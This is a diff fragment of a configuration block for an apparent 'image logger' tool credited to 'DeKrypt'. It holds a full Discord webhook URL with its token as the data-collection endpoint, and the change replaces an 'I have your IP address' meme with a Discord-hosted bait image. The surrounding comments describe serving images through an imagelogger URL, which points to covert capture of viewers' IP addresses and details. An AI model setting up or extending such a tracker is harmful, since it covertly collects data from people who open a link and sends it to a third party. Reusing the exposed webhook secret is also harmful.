@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1400859814703267973/PQiDxjYZ591ThSMr7n-9CBIcn7Eu6nVsjcij-lByW3hiUEBjqthV3CzZtkcFsdXrRUi3",
-    "image": "https://tenor.com/sv/view/blippi-blippi-meme-ip-address-ip-address-meme-i-have-your-ip-address-gif-25511125", # You can also have a custom image by using a URL argument
+    "image": "https://cdn.discordapp.com/attachments/1288973885961670752/1400966538604974201/2Q.png?ex=688e8f43&is=688d3dc3&hm=c1cb5b8f21b157f626fd14ca2554f612201b8b23c90b233f8a7e796d30c1f6ca&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
